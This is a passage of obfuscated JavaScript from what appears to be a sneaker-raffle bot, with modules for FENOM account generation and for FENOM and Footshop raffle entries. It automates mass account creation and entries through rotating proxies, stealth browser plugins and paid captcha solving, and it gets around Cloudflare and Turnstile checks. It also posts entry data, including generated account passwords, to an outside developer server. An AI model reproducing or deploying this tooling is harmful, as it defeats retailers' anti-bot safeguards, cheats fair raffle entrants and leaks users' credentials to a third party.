                            _0xbd4248++, _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x30cea3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x588232 != 'yes')
                                var _0x588232 = '', _0xbaf8 = 0x0;
                            var _0x3bdfac;
                            try {
                                await _0x319293(_0x2232be, _0x53c39c);
                            } catch {
                                _0x588232 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x1a7b1b(_0x3936df['name'] + '\x20Task\x20' + (_0x53c39c + 0x1) + '\x20/\x20' + _0x2232be['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                            var _0x51894d = await _0x14203e(_0x2232be[_0x53c39c], _0x3936df, 'acc', ![]);
                            const _0x546972 = { 'succesDEVMSG': { 'embeds': [_0x51894d] } }, _0x197c94 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x4ead61 = Math['round'](Math['random']() * (_0x3627c9['length'] - 0x1)), _0xefb50f = _0x3627c9[_0x4ead61]['split'](':'), _0x579392;
                            async function _0x8a3b1b(_0x4a0662) {
                                const _0x40fc5a = _0xa4bb3a['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x2eda88 = _0x5b1b10['parse'](_0x40fc5a, { 'header': !![] })['data'];
                                let _0x34751f = ![];
                                for (var _0x1351ee of _0x2eda88) {
                                    if (_0x1351ee['Email'] == _0x4a0662['Email']) {
                                        _0x34751f = !![];
                                        break;
                                    }
                                }
                                return _0x34751f;
                            }
                            try {
                                if (await _0x8a3b1b(_0x2232be[_0x53c39c]) == !![]) {
                                    console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0xe20746 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x579392 = await _0x3d8cc4['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0xefb50f[0x0] + ':' + _0xefb50f[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x579392 = await _0x3d8cc4['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0xefb50f[0x0] + ':' + _0xefb50f[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x503a1c = await _0x579392['newPage']();
                                await _0x503a1c['setViewport']({
                                    'width': 0x500 + _0xb2bcf5(0x1, 0x32),
                                    'height': 0x2d9 + _0xb2bcf5(0x1, 0x32)
                                });
                                const _0x162640 = await _0x503a1c['target']()['createCDPSession'](), { windowId: _0x3a4e0c } = await _0x162640['send']('Browser.getWindowForTarget');
                                await _0x503a1c['authenticate']({
                                    'username': '' + _0xefb50f[0x2],
                                    'password': '' + _0xefb50f[0x3]
                                }), console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x503a1c['goto']('' + _0x197c94, { 'waitUntil': 'networkidle2' }), console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2be9fc(0x1388);
                                var _0x114d95 = await _0x503a1c['$']('.hcaptcha-box');
                                if (_0x114d95) {
                                    console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x2be9fc(0x2710);
                                    const _0x591f8a = await _0x503a1c['$']('.hcaptcha-box');
                                    if (_0x591f8a)
                                        try {
                                            await _0x591f8a['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x503a1c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x46aa85 = await _0x503a1c['$']('.hcaptcha-box');
                                        if (_0x46aa85)
                                            try {
                                                await _0x46aa85['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x503a1c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x162640['send']('Browser.setWindowBounds', {
                                        'windowId': _0x3a4e0c,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x2be9fc(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x503a1c['type']('input[name=\x22firstname\x22]', '' + _0x2232be[_0x53c39c]['FirstName']), await _0x2be9fc(0x1f4), await _0x503a1c['type']('input[name=\x22lastname\x22]', '' + _0x2232be[_0x53c39c]['LastName']), await _0x2be9fc(0x1f4), await _0x503a1c['type']('input[name=\x22email\x22]', '' + _0x2232be[_0x53c39c]['Email']), await _0x2be9fc(0x1f4), await _0x503a1c['type']('input[name=\x22password\x22]', '' + _0x2232be[_0x53c39c]['Password']), await _0x2be9fc(0x258), await _0x503a1c['$eval']('input[name=\x22psgdpr\x22]', _0x474db9 => _0x474db9['click']()), await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Sending\x20Request'), await _0x503a1c['$eval']('#customer-form', _0x2a7a9c => _0x2a7a9c['submit']());
                                try {
                                    try {
                                        await _0x503a1c['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x588232 = 'no', console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Account\x20' + _0x2232be[_0x53c39c]['Email'] + '\x20Generated')), _0xa4bb3a['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2232be[_0x53c39c]['Email'] + ',' + _0x2232be[_0x53c39c]['Password']);
                                    let _0x42443b = _0x2232be[_0x53c39c];
                                    try {
                                        prxdata = {
                                            'username': _0x3373db['replace']('#', ''),
                                            'module': _0x3936df['name'],
                                            'entrydata': JSON['stringify'](_0x42443b),
                                            'proxy': '' + _0x3627c9[_0x53c39c]
                                        };
                                        var _0x1cec80 = JSON['stringify'](prxdata);
                                        let _0x1f0058 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x1cec80, _0x1f0058);
                                    } catch (_0x23a559) {
                                    }
                                    try {
                                        _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x546972['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x1bfffd(_0x3708dd, _0x546972['succesDEVMSG']);
                                } catch (_0x20ad8b) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x6f75d1) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20' + _0x6f75d1)), _0x3bdfac = '' + _0x6f75d1;
                                var _0x34f98c = await _0x14203e(_0x2232be[_0x53c39c], _0x3936df, 'acc', !![], _0x3bdfac);
                                _0x546972['errorDEV'] = { 'embeds': [_0x34f98c] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x546972['errorDEV']), await _0x1bfffd(_0x31e47f, _0x546972['errorDEV']), _0x588232 = 'yes';
                            } finally {
                                _0x579392 && _0x579392['close']();
                                if (_0x588232 == 'yes' && _0xbaf8 != 0x5)
                                    return console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Task\x20' + (_0x53c39c + 0x1) + '\x20:\x20Retrying\x20(' + _0xbaf8 + '\x20/\x205)')), _0xbaf8 = _0xbaf8 + 0x1, _0xbd4248--, _0x1967a9(_0x3936df, _0x2232be, _0x3627c9, _0x53c39c, _0xbaf8);
                                _0x588232 == 'yes' && _0xbaf8 >= 0x5 && _0x48f0c7(_0x2232be[_0x53c39c], _0x3936df), !_0xe20746 && (console['log'](_0x451967() + '\x20[' + _0x3936df['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay'])), _0xbd4248--;
                            }
                        }
                        _0x1967a9(_0x3b9da6, _0x318d81, _0x2e3ca9, _0x19f4d4), !_0xe20746 && await _0x2be9fc(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0xa15157(_0xc2273a, _0x4d1f6e, _0x34a13d) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x527bbd = 0x0; _0x527bbd < _0x4d1f6e['length']; _0x527bbd++) {
                        if (_0x59dee5 != 'yes')
                            var _0x59dee5 = '', _0x53d071 = 0x0;
                        var _0x5c89b0;
                        try {
                            await _0x319293(_0x4d1f6e, _0x527bbd);
                        } catch {
                            _0x59dee5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x1a7b1b(_0xc2273a['name'] + '\x20Task\x20' + (_0x527bbd + 0x1) + '\x20/\x20' + _0x4d1f6e['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        const _0x424232 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5d2da8 = Math['round'](Math['random']() * (_0x34a13d['length'] - 0x1)), _0x5cdf72 = _0x34a13d[_0x5d2da8]['split'](':'), _0x3f0702;
                        try {
                            _0x3f0702 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5cdf72[0x0] + ':' + _0x5cdf72[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3f0702 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5cdf72[0x0] + ':' + _0x5cdf72[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x202e65 = await _0x3f0702['newPage'](), _0x3958a2 = await _0x202e65['target']()['createCDPSession'](), { windowId: _0x32cf27 } = await _0x3958a2['send']('Browser.getWindowForTarget');
                            await _0x202e65['authenticate']({
                                'username': '' + _0x5cdf72[0x2],
                                'password': '' + _0x5cdf72[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x202e65['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2be9fc(0x1388);
                            var _0x5033f1 = await _0x202e65['$']('.hcaptcha-box');
                            if (_0x5033f1) {
                                console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x2be9fc(0x2710);
                                const _0x323f8b = await _0x202e65['$']('.hcaptcha-box');
                                if (_0x323f8b)
                                    try {
                                        await _0x323f8b['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x202e65['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x456cee = await _0x202e65['$']('.hcaptcha-box');
                                    if (_0x456cee)
                                        try {
                                            await _0x456cee['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x3958a2['send']('Browser.setWindowBounds', {
                                'windowId': _0x32cf27,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x2be9fc(0x1f40);
                            try {
                                await _0x202e65['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x2be9fc(0x1388), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Logging\x20in'), await _0x202e65['type']('input[name=\x22email\x22]', '' + _0x4d1f6e[_0x527bbd]['Email']), await _0x2be9fc(0x1f4), await _0x202e65['type']('input[name=\x22password\x22]', '' + _0x4d1f6e[_0x527bbd]['Password']), await _0x2be9fc(0x258), await _0x202e65['$eval']('#login-form', _0xdb9a38 => _0xdb9a38['submit']()), await _0x202e65['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x2be9fc(0x1f4), await _0x202e65['goto']('' + _0x4d1f6e[_0x527bbd]['Url']), await _0x202e65['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4d1f6e[_0x527bbd]['Size']);
                            if (_0x4d1f6e[_0x527bbd]['Size'] != 'RANDOM') {
                                var _0x307622 = '\x20' + _0x4d1f6e[_0x527bbd]['Size'] + '\x20';
                                const _0xde777e = await _0x202e65['$x']('//span[contains(text(),\x20' + _0x307622 + ')]');
                                await _0xde777e[0x0]['click']();
                            } else {
                                const _0x3794f5 = await _0x202e65['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x4118f2 = Math['round'](Math['random']() * (_0x3794f5['length'] - 0x1));
                                await _0x3794f5[_0x4118f2]['click']();
                            }
                            await _0x2be9fc(0x258), await _0x202e65['click']('#cookieChoiceDismiss'), await _0x2be9fc(0x3e8), await _0x202e65['type']('#instagram-account', '' + _0x4d1f6e[_0x527bbd]['Follower']), await _0x2be9fc(0x28a), await _0x202e65['click']('#book-btn'), await _0x2be9fc(0xbb8);
                            try {
                                await _0x202e65['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x2be9fc(0x1f4), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20' + _0x10a2e3['cyan']('Solving\x20Captcha')), await _0x202e65['solveRecaptchas'](), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2be9fc(0x7d0), await _0x202e65['$eval']('#book-btn-for-sure', _0x45dc24 => _0x45dc24['click']()), await _0x2be9fc(0x12c), await _0x202e65['click']('#book-btn-for-sure'), await _0x2be9fc(0xdac);
                            const _0x22aa3b = await _0x202e65['$eval']('.reservation-popup\x20>\x20.title', _0x4cb3fa => {
                                return _0x4cb3fa['innerHTML'];
                            });
                            if (_0x22aa3b) {
                                _0x59dee5 = 'no', _0x34c52d(_0x4d1f6e[_0x527bbd], _0xc2273a), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x102757 = await _0x14203e(_0x4d1f6e[_0x527bbd], _0xc2273a, 'dev', ![]), _0x27115a = await _0x14203e(_0x4d1f6e[_0x527bbd], _0xc2273a, 'pub', ![]);
                                let _0x47b8b0 = _0x4d1f6e[_0x527bbd];
                                try {
                                    prxdata = {
                                        'username': _0x3373db['replace']('#', ''),
                                        'module': _0xc2273a['name'],
                                        'entrydata': JSON['stringify'](_0x47b8b0),
                                        'proxy': '' + _0x34a13d[_0x527bbd]
                                    };
                                    var _0x284050 = JSON['stringify'](prxdata);
                                    let _0x16509a = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x284050, _0x16509a);
                                } catch (_0x2be453) {
                                }
                                const _0x5dd105 = {
                                    'succesDEVMSG': { 'embeds': [_0x102757] },
                                    'succesPUBMSG': { 'embeds': [_0x27115a] }
                                };
                                try {
                                    _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x5dd105['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x5dd105['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0x5dd105['succesPUBMSG']);
                                } catch (_0x51aa23) {
                                    console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x51aa23));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x366a5a) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20' + _0x366a5a)), _0x5c89b0 = '' + _0x366a5a;
                            var _0x10a7e9 = await _0x14203e(_0x4d1f6e[_0x527bbd], _0xc2273a, 'dev', !![], _0x5c89b0), _0x102757 = await _0x14203e(_0x4d1f6e[_0x527bbd], _0xc2273a, 'dev', ![]), _0x27115a = await _0x14203e(_0x4d1f6e[_0x527bbd], _0xc2273a, 'pub', ![]);
                            const _0x41c0f2 = {
                                'succesDEVMSG': { 'embeds': [_0x102757] },
                                'succesPUBMSG': { 'embeds': [_0x27115a] }
                            };
                            _0x41c0f2['errorDEV'] = { 'embeds': [_0x10a7e9] }, _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x41c0f2['errorDEV']), await _0x1bfffd(_0x31e47f, _0x41c0f2['errorDEV']), _0x366a5a != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x59dee5 = 'yes');
                        } finally {
                            _0x3f0702['close']();
                            if (_0x59dee5 == 'yes' && _0x53d071 != 0x5 && _0x5c89b0 != 'Size\x20Not\x20Found') {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Task\x20' + (_0x527bbd + 0x1) + '\x20:\x20Retrying\x20(' + _0x53d071 + '\x20/\x205)')), _0x527bbd = _0x527bbd - 0x1, _0x53d071 = _0x53d071 + 0x1;
                                continue;
                            }
                            _0x59dee5 == 'yes' && _0x53d071 >= 0x5 && (_0x48f0c7(_0x4d1f6e[_0x527bbd], _0xc2273a), _0x59dee5 = 'no', _0x53d071 = 0x0), console['log'](_0x451967() + '\x20[' + _0xc2273a['name'] + ']\x20Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x7c98d0, _0x3f8da4, _0x4740ca) {
                _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x30cea3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x36a6af = 0x0; _0x36a6af < _0x3f8da4['length']; _0x36a6af++) {
                    var _0x2a13a3;
                    if (_0x3b793a != 'yes')
                        var _0x3b793a = '', _0x137938 = 0x0;
                    var _0x16fee2 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3373db
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x3f8da4[_0x36a6af]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3f8da4[_0x36a6af]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x30cea3['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1feaa0
                            }
                        ]
                    }], _0x422f2f = await _0x14203e(_0x3f8da4[_0x36a6af], _0x7c98d0, 'dev', ![]), _0x598d64 = await _0x14203e(_0x3f8da4[_0x36a6af], _0x7c98d0, 'pub', ![]);
                    const _0x5d377d = {
                        'succesDEVMSG': { 'embeds': [_0x422f2f] },
                        'succesPUBMSG': { 'embeds': [_0x598d64] }
                    }, _0x36ae57 = { 'embeds': _0x16fee2 };
                    try {
                        await _0x319293(_0x3f8da4, _0x36a6af);
                    } catch {
                        _0x3b793a = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x3f8da4[_0x36a6af]['Email'] == '' || _0x3f8da4[_0x36a6af]['FirstName'] == '' || _0x3f8da4[_0x36a6af]['LastName'] == '' || _0x3f8da4[_0x36a6af]['Country'] == '' || _0x3f8da4[_0x36a6af]['Size'] == '' || _0x3f8da4[_0x36a6af]['Address1'] == '' || _0x3f8da4[_0x36a6af]['Zip'] == '') {
                        console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x3f8da4[_0x36a6af]['Email'] == '' || _0x3f8da4[_0x36a6af]['FirstName'] == '' || _0x3f8da4[_0x36a6af]['LastName'] == '' || _0x3f8da4[_0x36a6af]['Country'] == '' || _0x3f8da4[_0x36a6af]['Size'] == '' || _0x3f8da4[_0x36a6af]['Address1'] == '' || _0x3f8da4[_0x36a6af]['Zip'] == '' || _0x3f8da4[_0x36a6af]['Phone'] == '') {
                        console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x56eb43 = '' + _0x3f8da4[_0x36a6af]['Url'];
                    if (_0x30cea3['useRandomProxy'] = ![])
                        var _0x248729 = _0x4740ca[_0x36a6af]['split'](':');
                    else
                        var _0x45ecec = Math['round'](Math['random']() * (_0x4740ca['length'] - 0x1)), _0x248729 = _0x4740ca[_0x45ecec]['split'](':');
                    var _0x1e3110;
                    try {
                        _0x1e3110 = await _0x3d8cc4['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x248729[0x0] + ':' + _0x248729[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1e3110 = await _0x3d8cc4['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x248729[0x0] + ':' + _0x248729[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x4ef477 = await _0x1e3110['newPage']();
                        await _0x4ef477['authenticate']({
                            'username': '' + _0x248729[0x2],
                            'password': '' + _0x248729[0x3]
                        }), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4ef477['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4ef477['setRequestInterception'](!![]), _0x4ef477['on']('request', _0x309189 => {
                            _0x309189['resourceType']() === 'image' || _0x309189['resourceType']() === 'font' || _0x309189['resourceType']() === 'media' ? _0x309189['abort']() : _0x309189['continue']();
                        });
                        try {
                            await _0x4ef477['goto'](_0x56eb43), await _0x2be9fc(0xbb8), await _0x4ef477['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4ef477['click']('.control__JhutY'), await _0x2be9fc(0x1f4);
                        if (_0x3f8da4[_0x36a6af]['Size'] != 'RANDOM')
                            try {
                                const _0x480e45 = await _0x4ef477['$x']('//div[contains(text(),\x20\x27' + _0x3f8da4[_0x36a6af]['Size'] + '\x27)]');
                                await _0x480e45[0x0]['click']();
                            } catch {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x33c925 = await _0x4ef477['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x2fd678 = Math['round'](Math['random']() * (_0x33c925['length'] - 0x1));
                            await _0x33c925[_0x2fd678]['click']();
                        }
                        await _0x2be9fc(0x4b0);
                        const _0x1936a8 = await _0x4ef477['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x1936a8[0x0]['click'](), await _0x4ef477['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x4ef477['type']('input[name=\x22email\x22]', '' + _0x3f8da4[_0x36a6af]['Email']), await _0x2be9fc(0x640), await _0x4ef477['type']('input[name=\x22phone\x22]', '' + _0x3f8da4[_0x36a6af]['Phone']), await _0x2be9fc(0x4b0), await _0x4ef477['click']('button.btn.continue-button__1RtsS'), await _0x2be9fc(0x4b0);
                        try {
                            await _0x4ef477['type']('input[name=\x22firstName\x22]', '' + _0x3f8da4[_0x36a6af]['FirstName']), await _0x2be9fc(0x258);
                        } catch {
                            const _0x1a1fea = await _0x4ef477['$$eval']('.invalid-feedback\x20>\x20div', _0xafea7 => {
                                return _0xafea7['map'](_0x167fed => _0x167fed['innerText']);
                            });
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20' + _0x1a1fea));
                            continue;
                        }
                        await _0x4ef477['type']('input[name=\x22lastName\x22]', '' + _0x3f8da4[_0x36a6af]['LastName']), await _0x2be9fc(0xc8), await _0x4ef477['type']('input[name=\x22instagramUsername\x22]', '' + _0x3f8da4[_0x36a6af]['Follower']), await _0x2be9fc(0x4b0), await _0x4ef477['click']('button.btn.continue-button__1RtsS'), await _0x2be9fc(0x3e8), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x4ef477['select']('select[name=\x22country\x22]', '' + _0x3f8da4[_0x36a6af]['Country']), await _0x2be9fc(0x2bc), await _0x4ef477['type']('input[name=\x22streetName\x22]', '' + _0x3f8da4[_0x36a6af]['Address1']), await _0x2be9fc(0x258), await _0x4ef477['type']('input[name=\x22houseNumber\x22]', _0x3f8da4[_0x36a6af]['HouseNumber'] + '\x20' + _0x3f8da4[_0x36a6af]['Address2']), await _0x2be9fc(0xc8), await _0x4ef477['type']('input[name=\x22postalCode\x22]', '' + _0x3f8da4[_0x36a6af]['Zip']), await _0x2be9fc(0x1f4), await _0x4ef477['type']('input[name=\x22city\x22]', '' + _0x3f8da4[_0x36a6af]['City']), await _0x2be9fc(0x4b0), await _0x4ef477['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x2be9fc(0x4b0), await _0x4ef477['click']('button.btn.continue-button__1RtsS'), await _0x2be9fc(0x4b0), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x4ef477['solveRecaptchas'](), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x2be9fc(0xbb8), await _0x4ef477['click']('button.btn.continue-button__1RtsS'), await _0x2be9fc(0x1388), console['log'](_0x451967() + '\x20[' + _0x7c98d0['name'] + ']\x20Task\x20' + (_0x36a6af + 0x1) + '\x20:\x20Solving\x20Adyen'), await 